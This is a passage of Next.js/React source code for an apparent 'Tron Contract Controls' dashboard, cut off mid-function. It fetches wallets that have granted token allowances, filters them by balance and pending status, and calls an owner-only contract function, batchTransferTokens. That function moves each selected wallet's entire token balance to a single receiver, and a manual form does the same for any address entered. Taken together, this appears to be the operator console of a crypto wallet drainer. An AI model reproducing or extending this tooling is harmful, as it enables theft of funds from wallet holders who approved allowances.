"use client";

import { useState, useEffect, useMemo } from "react";
import TronWeb from "tronweb";
import { Breadcrumbs } from "@/components/breadcrumbs";
import PageContainer from "@/components/layout/page-container";
import { Heading } from "@/components/ui/heading";
import { Separator } from "@/components/ui/separator";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  AlertCircle,
  CheckCircle,
  RefreshCw,
  Send,
  Upload,
  Clock,
  FileText,
  Database,
  ChevronDown,
  ExternalLink,
  Loader2,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import { CONTRACT_ABI } from "@/utils/tronABI";
import { useToast } from "@/components/ui/use-toast";
import { tronWeb, isTronLinkInstalled, requestAccountAccess, requestAccountAccessWithInit, ensureTronWebAvailable, getTransactionInfo, isTronWebReady, waitForTronWebReady } from "@/utils/tronWeb";
import { WalletTable } from "@/components/tables/wallet-tables/wallet-table";
import { columns, Wallet, DeleteAllButton } from "@/components/tables/wallet-tables/columns";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { allowanceApi } from '@/lib/api-client';
import { TronFilters, WalletSearchParams as TronWalletSearchParams } from "./filters";
import { ExecutionTable } from "@/components/tables/wallet-tables/execution-table";

// Global constants
const CHAIN_ID = 728126428;
const TRON_NETWORK = {
  MAINNET: {
    fullNode: "https://api.trongrid.io",
    solidityNode: "https://api.trongrid.io",
    eventServer: "https://api.trongrid.io",
    chainId: CHAIN_ID,
  }
};
const TRONSCAN_URL = "https://tronscan.org";

// Error constants
const ERRORS = {
  TRONWEB_INIT: "Failed to initialize TronWeb",
  TRONLINK_NOT_FOUND: "TronLink extension not detected",
  WRONG_NETWORK: "Please connect to Tron Mainnet",
  NO_ACCOUNTS: "No accounts found in TronLink",
  CONNECTION_FAILED: "Failed to connect to TronLink",
  INVALID_ADDRESS: "Invalid Tron address provided",
  NO_WALLETS: "No wallets loaded for transfer",
  API_FAILURE: "Failed to fetch wallet data from API",
  TRANSACTION_FAILED: "Transaction failed",
  TRANSACTION_TIMEOUT: "Transaction confirmation timed out",
  CONTRACT_INIT: "Failed to initialize contract",
  UNKNOWN_ERROR: "An unknown error occurred",
};

// Add this new interface for better type safety
interface TronWebWindow extends Window {
  tronWeb?: TronWeb & {
    ready?: boolean;
    defaultAddress?: {
      base58: string;
      hex: string;
    };
    fullNode?: {
      host: string;
      chainId?: string;
    };
  };
  tronLink?: {
    ready: boolean;
    request: (args: { method: string }) => Promise<string[]>;
  };
}

declare const window: TronWebWindow;

const breadcrumbItems = [
  { title: "Dashboard", link: "/dashboard" },
  { title: "Tron Contract Controls", link: "/dashboard/tron" },
];

interface WalletData {
  id: string;
  walletAddress: string;
  tokenAddresses: string[];
  allowedTokens: string[];
}

// Add WalletSearchParams type for Tron (reuse from Ethereum filters if needed)
interface WalletSearchParams {
  chainId: string | number;
  walletAddress?: string;
  minBalance?: string;
  maxBalance?: string;
  startDate?: string;
  endDate?: string;
  executionFilter?: string;
  page: number;
  pageSize: number;
}

const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_TRON_CONTRACT_ADDRESS; // Ensure this is set in your environment variables

// Environment variable setup instructions:
// 1. Create a .env.local file in your project root
// 2. Add: NEXT_PUBLIC_TRON_CONTRACT_ADDRESS=your_contract_address_here
// 3. Restart your development server

export default function Page() {
  const { toast } = useToast();
  const [sourceWallets, setSourceWallets] = useState("");
  const [tokenAddresses, setTokenAddresses] = useState("");
  const [receiverAddress, setReceiverAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [walletData, setWalletData] = useState<WalletData[]>([]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [txHash, setTxHash] = useState("");
  const [txStatus, setTxStatus] = useState("");
  const [tronWeb, setTronWeb] = useState<TronWeb | null>(null);
  const [currentAddress, setCurrentAddress] = useState<string | null>(null);
  const [connectionStatus, setConnectionStatus] = useState("connected");
  const [batchDetails, setBatchDetails] = useState<{
    timestamp: string;
    totalTransfers: number;
    successfulTransfers: number;
  } | null>(null);
  const [isOwner, setIsOwner] = useState(false);
  const [batchId, setBatchId] = useState<string>("");
  const [activeTab, setActiveTab] = useState("wallet-data");
  const [walletTableData, setWalletTableData] = useState<Wallet[]>([]);
  const [pendingWalletData, setPendingWalletData] = useState<Wallet[]>([]);
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [selectedWallets, setSelectedWallets] = useState<string[]>([]);
  const [isSelectingWallets, setIsSelectingWallets] = useState(false);
  const [isPendingLoading, setIsPendingLoading] = useState(false);

  // Add state for wallet search params and pagination
  const [searchParams, setSearchParams] = useState<TronWalletSearchParams>({
    chainId: CHAIN_ID.toString(),
    page: 1,
    pageSize: 10,
    startDate: null,
    endDate: null,
  });
  const [totalCount, setTotalCount] = useState(0);
  const [totalPages, setTotalPages] = useState(1);
  
  // Search params for pending tokens (execution tab)
  const [pendingSearchParams, setPendingSearchParams] = useState<TronWalletSearchParams>({
    chainId: CHAIN_ID.toString(),
    page: 1,
    pageSize: 10,
    startDate: null,
    endDate: null,
    executionFilter: "pending"
  });
  const [pendingTotalCount, setPendingTotalCount] = useState(0);
  const [pendingTotalPages, setPendingTotalPages] = useState(1);

  // Manual control form state
  const [fromAddress, setFromAddress] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [tokenInputs, setTokenInputs] = useState([{ tokenAddress: "", amount: "" }]);
  const [isTransferring, setIsTransferring] = useState(false);

  // Show toast notification
  const showError = (title: string, description?: string) => {
    toast({
      variant: "destructive",
      title,
      description,
    });
  };

  // Show success notification
  const showSuccess = (title: string, description?: string) => {
    toast({
      variant: "default",
      title,
      description,
    });
  };





  // Improved TronWeb initialization
  useEffect(() => {
    const initTronWeb = async () => {
      try {
        // First try to use TronLink's injected TronWeb
        if (window.tronWeb && window.tronWeb.ready) {
          setTronWeb(window.tronWeb);
          if (window.tronWeb.defaultAddress?.base58) {
            setCurrentAddress(window.tronWeb.defaultAddress.base58);
            setConnectionStatus("connected");
          }
          return;
        }

        // Fallback to creating new TronWeb instance
        const tronWebInstance = new TronWeb({
          fullHost: TRON_NETWORK.MAINNET.fullNode,
          headers: { "TRON-PRO-API-KEY": process.env.NEXT_PUBLIC_TRONGRID_API_KEY },
        });

        setTronWeb(tronWebInstance);

        // Watch for TronLink injection
        const checkTronLink = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            setTronWeb(window.tronWeb);
            clearInterval(checkTronLink);
          }
        }, 500);

        // Cleanup interval
        return () => clearInterval(checkTronLink);
      } catch (error) {
        console.error("TronWeb initialization error:", error);
        showError(ERRORS.TRONWEB_INIT, getErrorMessage(error));
      }
    };

    initTronWeb();
  }, []);

  useEffect(() => {
    const checkOwnership = async () => {
      if (!tronWeb || !currentAddress) return;
      
      try {

        if (!CONTRACT_ADDRESS) {
          throw new Error("CONTRACT_ADDRESS is not defined");
        }

        const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
        const owner = await contract.owner().call();
        // Convert hex address to base58 format
        const ownerBase58 = tronWeb.address.fromHex(owner);
        setIsOwner(ownerBase58.toLowerCase() === currentAddress.toLowerCase());
      } catch (error) {
        console.error("Error checking ownership:", error);
      }
    };

    checkOwnership();
  }, [tronWeb, currentAddress]);

  // Get user-friendly error message
  const getErrorMessage = (error: unknown): string => {
    if (error instanceof Error) {
      // Handle specific TronWeb errors
      if (error.message.includes("already exists with the same id")) {
        return "Transaction with same ID already exists";
      }
      if (error.message.includes("insufficient energy")) {
        return "Insufficient energy for transaction";
      }
      if (error.message.includes("contract validate error")) {
        return "Contract validation failed";
      }
      return error.message;
    }
    return typeof error === "string" ? error : ERRORS.UNKNOWN_ERROR;
  };

  const waitForTronLink = async (): Promise<boolean> => {
    const maxAttempts = 10;
    for (let i = 0; i < maxAttempts; i++) {
      if (window.tronWeb && window.tronLink) {
        return true;
      }
      await new Promise(resolve => setTimeout(resolve, 200));
    }
    return false;
  };
  
  // Improved network check
  const checkNetwork = async (): Promise<boolean> => {
    try {
      if (!window.tronWeb) return false;

      const currentNode = window.tronWeb.fullNode.host;
      const isMainnet = currentNode.includes('trongrid.io') && !currentNode.includes('shasta') && !currentNode.includes('nile');
      
      if (!isMainnet) {
        const network = await window.tronWeb.trx.getCurrentBlock();
        return network.blockID != null;
      }

      return true;
    } catch (error) {
      console.error("Network check error:", error);
      return false;
    }
  };

  // Tron-specific address validation
  const isValidTronAddress = (address: string): boolean => {
    if (!address) return false;

    // Basic format check
    if (!address.startsWith("T") || address.length !== 34) {
      return false;
    }

    // Additional checks if TronWeb is available
    if (tronWeb) {
      try {
        return tronWeb.isAddress(address);
      } catch (error) {
        console.error("Address validation error:", error);
        return false;
      }
    }

    // Fallback simple validation
    const base58Regex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
    return base58Regex.test(address);
  };

  // Convert hex to base58 if needed (for API responses)
  const ensureBase58Address = (address: string): string => {
    if (!address) return "";

    // If it's already in base58 format
    if (address.startsWith("T")) return address;

    // If it's in hex format (shouldn't happen with Tron-specific API)
    if (address.startsWith("0x") || address.startsWith("41")) {
      if (tronWeb) {
        try {
          return tronWeb.address.fromHex(address);
        } catch (e) {
          console.error("Error converting hex to base58:", e);
        }
      }
    }

    return address; // Return as-is if conversion fails
  };

  const handleFetchAllWallets = async () => {
    setIsLoading(true);
    try {
      const response = await allowanceApi.getByChain(CHAIN_ID.toString());
      const data = response.success ? response.data : [];
      setWalletData(data);
      
      // Transform data for the table
      const tableData = data.map((wallet: WalletData) => ({
        id: wallet.id,
        walletAddress: wallet.walletAddress,
        tokenAddresses: wallet.allowedTokens, // Note: API returns allowedTokens instead of tokenAddresses
        chainId: CHAIN_ID,
        createdAt: new Date().toISOString(),
      }));
      setWalletTableData(tableData);

      // Format the wallet addresses as comma separated string
      const wallets = data
        .map((item: WalletData) => item.walletAddress)
        .join(", ");
      setSourceWallets(wallets);

      // Format the token addresses as grouped by wallet, one per line
      const tokens = data
        .map((item: WalletData) => item.allowedTokens.join(", ")) // Note: API returns allowedTokens
        .join("\n");
      setTokenAddresses(tokens);
    } catch (error) {
      console.error("Error fetching wallet data:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Add effect to fetch wallet data using search API when tab is wallet-data or searchParams change
  useEffect(() => {
    if (activeTab === "wallet-data") {
      // Convert date fields to string for API
      const params = {
        ...searchParams,
        startDate: searchParams.startDate ? searchParams.startDate.toISOString() : undefined,
        endDate: searchParams.endDate ? searchParams.endDate.toISOString() : undefined,
      };
      searchWallets(params);
    }
  }, [searchParams, activeTab]);

  // Load pending wallets whenever pendingSearchParams changes or when execution tab is active
  useEffect(() => {
    if (activeTab === "execution") {
      const params = {
        ...pendingSearchParams,
        startDate: pendingSearchParams.startDate ? pendingSearchParams.startDate.toISOString() : undefined,
        endDate: pendingSearchParams.endDate ? pendingSearchParams.endDate.toISOString() : undefined,
      };
      searchPendingWallets(params);
    }
  }, [pendingSearchParams, activeTab]);

  // Implement searchWallets for Tron (similar to Ethereum)
  const searchWallets = async (params: any) => {
    setIsLoading(true);
    try {
      // Fix executionFilter type for API
      let executionFilter: 'new' | 'pending' | 'executed' | 'all' | undefined = undefined;
      if (params.executionFilter === 'new' || params.executionFilter === 'pending' || params.executionFilter === 'executed' || params.executionFilter === 'all') {
        executionFilter = params.executionFilter;
      }
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress || undefined,
        minBalance: params.minBalance || undefined,
        maxBalance: params.maxBalance || undefined,
        startDate: params.startDate || undefined,
        endDate: params.endDate || undefined,
        executionFilter,
        page: params.page,
        pageSize: params.pageSize
      };
      const response = await allowanceApi.search(apiSearchParams);
      if (!response.success) {
        setWalletTableData([]);
        setTotalCount(0);
        setTotalPages(1);
        return;
      }
      setTotalCount(response.data?.total || 0);
      setTotalPages(response.data?.totalPages || 1);
      const flattened = response.data?.results || [];
      if (flattened.length === 0) {
        setWalletTableData([]);
        return;
      }
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: CHAIN_ID,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      setWalletTableData(tableData);
    } catch (error) {
      setWalletTableData([]);
    } finally {
      setIsLoading(false);
    }
  };

  // Search specifically for pending tokens - used in execution tab
  const searchPendingWallets = async (params: any) => {
    setIsPendingLoading(true);
    try {
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress || undefined,
        minBalance: params.minBalance || undefined,
        maxBalance: params.maxBalance || undefined,
        startDate: params.startDate || undefined,
        endDate: params.endDate || undefined,
        executionFilter: "pending" as "pending",
        page: params.page,
        pageSize: params.pageSize
      };
      const response = await allowanceApi.search(apiSearchParams);
      if (!response.success) {
        setPendingWalletData([]);
        setPendingTotalCount(0);
        setPendingTotalPages(1);
        return;
      }
      setPendingTotalCount(response.data?.total || 0);
      setPendingTotalPages(response.data?.totalPages || 1);
      const flattened = response.data?.results || [];
      if (flattened.length === 0) {
        setPendingWalletData([]);
        return;
      }
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: CHAIN_ID,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      setPendingWalletData(tableData);
    } catch (error) {
      setPendingWalletData([]);
    } finally {
      setIsPendingLoading(false);
    }
  };

  // Add handler for page change (pagination)
  const handlePageChange = (newPage: number) => {
    setSearchParams(prev => ({
      ...prev,
      page: newPage
    }));
  };

  // Handle pending page change - called from ExecutionTable
  const handlePendingPageChange = (newPage: number) => {
    setPendingSearchParams(prev => ({
      ...prev,
      page: newPage
    }));
  };

  // Refresh pending tokens data
  const refreshPendingTokens = async () => {
    // Reset to page 1 but keep the pending filter
    const refreshParams = {
      ...pendingSearchParams,
      page: 1
    };
    
    setPendingSearchParams(refreshParams);
    // The useEffect will automatically trigger the API call
  };

  // Reset the manual control form
  const resetManualControlForm = () => {
    setFromAddress("");
    setToAddress("");
    setTokenInputs([{ tokenAddress: "", amount: "" }]);
    toast({
      title: "Form Reset",
      description: "Manual control form has been reset.",
      variant: "default"
    });
  };

  // Add another token input row
  const addTokenRow = () => {
    setTokenInputs([...tokenInputs, { tokenAddress: "", amount: "" }]);
  };

  // Remove a token input row
  const removeTokenRow = (index: number) => {
    if (tokenInputs.length > 1) {
      const newTokens = [...tokenInputs];
      newTokens.splice(index, 1);
      setTokenInputs(newTokens);
    }
  };

  // Update token at specific index
  const updateTokenField = (index: number, field: "tokenAddress" | "amount", value: string) => {
    const newTokens = [...tokenInputs];
    newTokens[index][field] = value;
    setTokenInputs(newTokens);
  };

  // Handler for manual batch transfer - implements batchTransferTokens for Tron manual control
  const handleManualBatchTransfer = async () => {
    console.log("🚀 ~ handleManualBatchTransfer ~ Starting Tron manual batch transfer...");
    
    // Reset any previous messages
    setIsTransferring(true);

    try {
      // 1. FIRST - Check and ensure wallet connection (same as execution handler)
      console.log("🚀 ~ handleManualBatchTransfer ~ Checking TronLink wallet connection...");
      
      // Check if TronLink is installed
      if (!window.tronLink) {
        console.error("🚀 ~ handleManualBatchTransfer ~ TronLink extension not detected");
        showError("TronLink extension not detected", "Please install TronLink extension first!");
        return;
      }

      // Check if TronWeb is available and ready
      if (!isTronWebReady()) {
        console.log("🚀 ~ handleManualBatchTransfer ~ TronLink not connected, attempting connection...");
        
        try {
          // Request account access to establish connection
          console.log("🚀 ~ handleManualBatchTransfer ~ Requesting TronLink account access...");
          await requestAccountAccessWithInit();
          
          // Wait for TronWeb to be properly initialized and ready
          console.log("🚀 ~ handleManualBatchTransfer ~ Waiting for TronWeb to be ready...");
          const isReady = await waitForTronWebReady(10000); // Wait up to 10 seconds
          
          if (!isReady) {
            // Try one more time with the comprehensive approach
            console.log("🚀 ~ handleManualBatchTransfer ~ Initial wait failed, trying comprehensive initialization...");
            const finalCheck = await ensureTronWebAvailable();
            if (!finalCheck) {
              throw new Error("TronLink connection failed. TronWeb not ready after connection attempt.");
            }
          }
          
          console.log("🚀 ~ handleManualBatchTransfer ~ TronLink connection established successfully!");
        } catch (connectError) {
          console.error("🚀 ~ handleManualBatchTransfer ~ Failed to connect to TronLink:", connectError);
          showError("TronLink Connection Failed", `Failed to connect to TronLink: ${(connectError as any)?.message || 'Connection failed'}`);
          return;
        }
      } else {
        console.log("🚀 ~ handleManualBatchTransfer ~ TronLink already connected and ready!");
      }

      // Double-check connection before proceeding
      const connected = await ensureTronLinkConnection();
      if (!connected) {
        console.error("🚀 ~ handleManualBatchTransfer ~ Final connection check failed");
        showError("Connection Failed", "Unable to establish stable TronLink connection. Please try again.");
        return;
      }

      // 2. Validate form inputs
      console.log("🚀 ~ handleManualBatchTransfer ~ Validating form inputs...");
      
      // Validate from address
      if (!fromAddress || !isValidTronAddress(fromAddress)) {
        console.error("🚀 ~ handleManualBatchTransfer ~ Invalid from address");
        showError("Invalid From Address", "Please enter a valid Tron from address (TR... format).");
        return;
      }

      // Validate to address (receiver)
      if (!toAddress || !isValidTronAddress(toAddress)) {
        console.error("🚀 ~ handleManualBatchTransfer ~ Invalid to address");
        showError("Invalid To Address", "Please enter a valid Tron to address (TR... format).");
        return;
      }

      // Validate token inputs
      const hasEmptyFields = tokenInputs.some(token => !token.tokenAddress || !token.amount);
      if (hasEmptyFields) {
        showError("Incomplete Information", "Please fill in all token addresses and amounts.");
        return;
      }

      // Validate token addresses
      const invalidTokens = tokenInputs.filter(token => !isValidTronAddress(token.tokenAddress));
      if (invalidTokens.length > 0) {
        showError("Invalid Token Addresses", "One or more token addresses are invalid. Please check the TR... format.");
        return;
      }

      // Validate amounts
      const invalidAmounts = tokenInputs.filter(token => {
        const amount = parseFloat(token.amount);
        return isNaN(amount) || amount <= 0;
      });
      if (invalidAmounts.length > 0) {
        showError("Invalid Amounts", "One or more amounts are invalid. Please enter positive numbers.");
        return;
      }

      // 3. Prepare data for batchTransferTokens contract call
      console.log("🚀 ~ handleManualBatchTransfer ~ Preparing data for batchTransferTokens function...");
      
      // For manual control, we have a single wallet (fromAddress) transferring multiple tokens
      const wallets = [fromAddress];
      const tokensPerWallet = [tokenInputs.map(token => token.tokenAddress)];

      // 4. LOG THE EXACT FORMAT FOR batchTransferTokens FUNCTION
      console.log("🚀 ~ handleManualBatchTransfer ~ ========== DATA FORMAT FOR batchTransferTokens ==========");
      console.log("🚀 ~ Function signature: batchTransferTokens(address[] wallets, address[][] tokens, address receiver)");
      console.log("🚀 ~ Raw data (Base58 format):");
      console.log("   - Wallets array:", wallets);
      console.log("   - Tokens per wallet (2D array):", tokensPerWallet);
      console.log("   - Receiver address:", toAddress);
      console.log("🚀 ~ Transfer details breakdown:");
      tokenInputs.forEach((token, index) => {
        console.log(`   ${index + 1}. ${fromAddress} -> ${token.tokenAddress} (Amount: ${token.amount}) -> ${toAddress}`);
      });

      // Convert addresses to hex format for contract call
      console.log("🚀 ~ handleManualBatchTransfer ~ Converting addresses to hex format for contract...");
      
      // Ensure TronWeb is available before using it
      if (!isTronWebReady()) {
        console.error("🚀 ~ handleManualBatchTransfer ~ TronWeb not available for address conversion");
        showError("TronWeb Error", "TronWeb connection lost. Please reconnect your wallet and try again.");
        return;
      }
      
      // At this point, we know TronWeb is available due to the check above
      const tronWebInstance = window.tronWeb!;
      const hexWallets = wallets.map(wallet => tronWebInstance.address.toHex(wallet));
      const hexTokensPerWallet = tokensPerWallet.map(tokenList => 
        tokenList.map(token => tronWebInstance.address.toHex(token))
      );
      const hexReceiver = tronWebInstance.address.toHex(toAddress);

      console.log("🚀 ~ handleManualBatchTransfer ~ Contract call format (HEX addresses):");
      console.log("   - Hex wallets:", JSON.stringify(hexWallets, null, 2));
      console.log("   - Hex tokens (2D array):", JSON.stringify(hexTokensPerWallet, null, 2));
      console.log("   - Hex receiver:", hexReceiver);
      console.log("🚀 ~ Final contract call:");
      console.log(`   contract.batchTransferTokens(`);
      console.log(`     ${JSON.stringify(hexWallets, null, 4)},`);
      console.log(`     ${JSON.stringify(hexTokensPerWallet, null, 4)},`);
      console.log(`     "${hexReceiver}"`);
      console.log(`   )`);
      console.log("🚀 ~ =========================================================");

      // 5. Create contract instance and execute batchTransferTokens
      console.log("🚀 ~ handleManualBatchTransfer ~ Creating contract instance...");
      
      // Ensure TronWeb is available before creating contract
      if (!isTronWebReady()) {
        console.error("🚀 ~ handleManualBatchTransfer ~ TronWeb not available for contract creation");
        showError("TronWeb Error", "TronWeb connection lost. Please reconnect your wallet and try again.");
        return;
      }
      
      if (!CONTRACT_ADDRESS) {
        const errorMsg = "CONTRACT_ADDRESS environment variable is not defined. Please set NEXT_PUBLIC_TRON_CONTRACT_ADDRESS in your environment variables.";
        console.error("🚀 ~ handleManualBatchTransfer ~ Configuration Error:", errorMsg);
        showError("Configuration Error", errorMsg);
        return;
      }

      const contract = await tronWebInstance.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      
      console.log("🚀 ~ handleManualBatchTransfer ~ Calling batchTransferTokens function...");
      console.log("🚀 ~ Contract Address:", CONTRACT_ADDRESS);
      console.log("🚀 ~ Function Parameters:", {
        walletsCount: hexWallets.length,
        tokensCount: hexTokensPerWallet.reduce((acc, tokens) => acc + tokens.length, 0),
        receiver: hexReceiver
      });
      
      const tx = await contract.batchTransferTokens(
        hexWallets,
        hexTokensPerWallet,
        hexReceiver
      ).send({
        feeLimit: 150_000_000, // Fee limit for the transaction
        callValue: 0,
        shouldPollResponse: false
      });

      console.log("🚀 ~ handleManualBatchTransfer ~ Transaction sent successfully! TX Hash:", tx);

      // Show transaction sent message
      showSuccess("Transaction Sent", `Transaction sent! TX Hash: ${tx}. Waiting for confirmation...`);

      // 6. Wait for transaction confirmation
      console.log("🚀 ~ handleManualBatchTransfer ~ Waiting for transaction confirmation...");
      let receipt = null;
      const maxAttempts = 60; // Poll for ~2 minutes (60 * 2s)
      
      for (let i = 0; i < maxAttempts; i++) {
        try {
          receipt = await tronWebInstance.trx.getTransactionInfo(tx);
          if (receipt && receipt.receipt) {
            console.log(`🚀 ~ handleManualBatchTransfer ~ Transaction confirmed on attempt ${i + 1}:`, receipt);
            break;
          }
        } catch (pollError) {
          console.log(`🚀 ~ handleManualBatchTransfer ~ Polling attempt ${i + 1} failed:`, pollError);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      // 7. Validate transaction result and show final message
      if (receipt && receipt.receipt && receipt.receipt.result === "SUCCESS") {
        console.log("🚀 ~ handleManualBatchTransfer ~ ✅ Transaction SUCCESSFUL!");
        console.log("🚀 ~ handleManualBatchTransfer ~ Transaction Receipt:", receipt);
        
        const tokenCount = tokenInputs.length;
        showSuccess("Batch Transfer Successful", `Successfully transferred ${tokenCount} token${tokenCount > 1 ? 's' : ''} from ${fromAddress} to ${toAddress}. TX Hash: ${tx}`);

        // Optionally reset the form after successful transfer
        // resetManualControlForm();
      } else {
        const errorMsg = receipt?.receipt?.result 
          ? `Transaction failed with status: ${receipt.receipt.result}`
          : "Transaction confirmation timed out or receipt incomplete";
        
        console.error("🚀 ~ handleManualBatchTransfer ~ ❌ Transaction FAILED:", errorMsg);
        console.error("🚀 ~ handleManualBatchTransfer ~ Receipt:", receipt);
        
        showError("Transfer Failed", `${errorMsg}. TX Hash: ${tx}`);
      }

    } catch (error) {
      console.error("🚀 ~ handleManualBatchTransfer ~ ❌ Execution Error:", error);
      const errorMsg = (error as any)?.message || "Unknown error occurred during transfer";
      
      showError("Transfer Error", `Transfer failed: ${errorMsg}`);
    } finally {
      setIsTransferring(false);
    }
  };

  // Handler for batch execution from ExecutionTable - implements batchTransferTokens for Tron
  const handleExecuteTokens = async (selectedRows: Wallet[]) => {
    console.log("🚀 ~ handleExecuteTokens ~ Starting Tron execution with selectedRows:", selectedRows);
    
    // 1. FIRST - Check and ensure wallet connection (as requested)
    console.log("🚀 ~ handleExecuteTokens ~ Checking TronLink wallet connection...");
    
    try {
      // Check if TronLink is installed
      if (!window.tronLink) {
        console.error("🚀 ~ handleExecuteTokens ~ TronLink extension not detected");
        return { error: "TronLink extension not detected. Please install TronLink extension first!" };
      }

      // Check if TronWeb is available and ready
      if (!isTronWebReady()) {
        console.log("🚀 ~ handleExecuteTokens ~ TronLink not connected, attempting connection...");
        
        try {
          // Request account access to establish connection
          console.log("🚀 ~ handleExecuteTokens ~ Requesting TronLink account access...");
          await requestAccountAccessWithInit();
          
          // Wait for TronWeb to be ready after connection
          const isReady = await waitForTronWebReady(10000);
          
          // Verify connection was successful
          if (!isReady) {
            // Try one more time with the comprehensive approach
            console.log("🚀 ~ handleExecuteTokens ~ Initial wait failed, trying comprehensive initialization...");
            const finalCheck = await ensureTronWebAvailable();
            if (!finalCheck) {
              throw new Error("TronLink connection failed. TronWeb not ready after connection attempt.");
            }
          }
          
          console.log("🚀 ~ handleExecuteTokens ~ TronLink connection established successfully!");
        } catch (connectError) {
          console.error("🚀 ~ handleExecuteTokens ~ Failed to connect to TronLink:", connectError);
          return { error: `Failed to connect to TronLink: ${(connectError as any)?.message || 'Connection failed'}` };
        }
      } else {
        console.log("🚀 ~ handleExecuteTokens ~ TronLink already connected and ready!");
      }

      // Double-check connection before proceeding
      const connected = await ensureTronLinkConnection();
      if (!connected) {
        console.error("🚀 ~ handleExecuteTokens ~ Final connection check failed");
        return { error: "Unable to establish stable TronLink connection. Please try again." };
      }

    } catch (connectionError) {
      console.error("🚀 ~ handleExecuteTokens ~ Wallet connection error:", connectionError);
      return { error: `Wallet connection failed: ${(connectionError as any)?.message || 'Unknown connection error'}` };
    }

    // 2. Validate receiver address
    console.log("🚀 ~ handleExecuteTokens ~ Validating receiver address:", receiverAddress);
    if (!receiverAddress || !isValidTronAddress(receiverAddress)) {
      console.error("🚀 ~ handleExecuteTokens ~ Invalid receiver address");
      return { error: "Please enter a valid Tron receiver address (TR... format) in the execution tab." };
    }

    // 3. Collect all transfer details from selected rows
    console.log("🚀 ~ handleExecuteTokens ~ Processing selected rows for token transfers...");
    const transferDetails: Array<{
      walletAddress: string;
      tokenAddress: string;
      amount: string;
    }> = [];

    if (Array.isArray(selectedRows)) {
      selectedRows.forEach(row => {
        // Only include tokens with 'pending' status
        const pendingTokens = Array.isArray(row.executionStatus)
          ? row.executionStatus.filter((s: any) => s.status === 'pending')
          : [];
        
        const tokenBalances = Array.isArray(row.tokenBalances) ? row.tokenBalances : [];
        
        pendingTokens.forEach((tokenStatus: any) => {
          const bal = tokenBalances.find(t => t.tokenAddress?.toLowerCase() === tokenStatus.tokenAddress?.toLowerCase());
          const balance = bal?.balance || "0";
          
          transferDetails.push({
            walletAddress: row.walletAddress,
            tokenAddress: tokenStatus.tokenAddress,
            amount: balance
          });
        });
      });
    }

    if (transferDetails.length === 0) {
      console.warn("🚀 ~ handleExecuteTokens ~ No pending tokens found to execute");
      return { error: 'No pending tokens to execute.' };
    }

    console.log("🚀 ~ handleExecuteTokens ~ Transfer details collected:", transferDetails);

    try {
      // 4. Prepare data for batchTransferTokens contract call
      console.log("🚀 ~ handleExecuteTokens ~ Preparing data for batchTransferTokens function...");
      
      // Group transfers by wallet to match contract expected format
      const walletTokenMap = new Map<string, string[]>();
      
      transferDetails.forEach(({ walletAddress, tokenAddress }) => {
        if (!walletTokenMap.has(walletAddress)) {
          walletTokenMap.set(walletAddress, []);
        }
        const tokens = walletTokenMap.get(walletAddress)!;
        if (!tokens.includes(tokenAddress)) {
          tokens.push(tokenAddress);
        }
      });

      // Convert to arrays for contract call
      const wallets = Array.from(walletTokenMap.keys());
      const tokensPerWallet = Array.from(walletTokenMap.values());

      // 5. LOG THE EXACT FORMAT FOR batchTransferTokens FUNCTION (as requested)
      console.log("🚀 ~ handleExecuteTokens ~ ========== DATA FORMAT FOR batchTransferTokens ==========");
      console.log("🚀 ~ Function signature: batchTransferTokens(address[] wallets, address[][] tokens, address receiver)");
      console.log("🚀 ~ Raw data (Base58 format):");
      console.log("   - Wallets array:", wallets);
      console.log("   - Tokens per wallet (2D array):", tokensPerWallet);
      console.log("   - Receiver address:", receiverAddress);
      console.log("🚀 ~ Transfer details breakdown:");
      transferDetails.forEach((detail, index) => {
        console.log(`   ${index + 1}. ${detail.walletAddress} -> ${detail.tokenAddress} (Amount: ${detail.amount})`);
      });

      // Convert addresses to hex format for contract call
      console.log("🚀 ~ handleExecuteTokens ~ Converting addresses to hex format for contract...");
      
      // Ensure TronWeb is available before using it
      if (!window.tronWeb) {
        console.error("🚀 ~ handleExecuteTokens ~ TronWeb not available for address conversion");
        return { error: "TronWeb not available for address conversion. Please try again." };
      }
      
      const hexWallets = wallets.map(wallet => window.tronWeb!.address.toHex(wallet));
      const hexTokensPerWallet = tokensPerWallet.map(tokenList => 
        tokenList.map(token => window.tronWeb!.address.toHex(token))
      );
      const hexReceiver = window.tronWeb!.address.toHex(receiverAddress);

      console.log("🚀 ~ handleExecuteTokens ~ Contract call format (HEX addresses):");
      console.log("   - Hex wallets:", JSON.stringify(hexWallets, null, 2));
      console.log("   - Hex tokens (2D array):", JSON.stringify(hexTokensPerWallet, null, 2));
      console.log("   - Hex receiver:", hexReceiver);
      console.log("🚀 ~ Final contract call:");
      console.log(`   contract.batchTransferTokens(`);
      console.log(`     ${JSON.stringify(hexWallets, null, 4)},`);
